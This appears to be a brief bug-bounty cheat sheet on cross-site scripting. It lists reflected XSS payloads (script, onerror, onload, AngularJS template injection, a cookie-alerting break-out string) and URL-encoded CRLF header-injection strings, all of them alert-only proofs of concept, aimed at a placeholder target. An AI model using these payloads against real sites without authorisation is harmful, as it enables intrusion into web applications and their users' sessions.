# Cross-Site Scripting (XSS)
1. [Finding XSS using Web Archive](https://github.com/djmahe4/bug-bounty/blob/main/XSS/Wayback.md)
## Reflected XSS
1. ```https://www.target.net/inc.search_ney.php```>```<script>alert()</script>```,```<img src=x onerror=alert()>```,```<svg onload=alert()>``` >[link](https://medium.com/@osamaashraf1233/reflected-cross-site-scripting-in-search-functionality-d584593b966f)
2. `">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert(document.cookie)</script><meta`
3. Angular JS: `{{$on.constructor('alert(document.domain)')()}}`
4. Custom url payload: `api/v1/db/auth/password/reset:USER_TOKEN_ID`

## CRLF

1. `/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E`

## Payloads
- **[XSS Now website](https://xssnow.in/)**
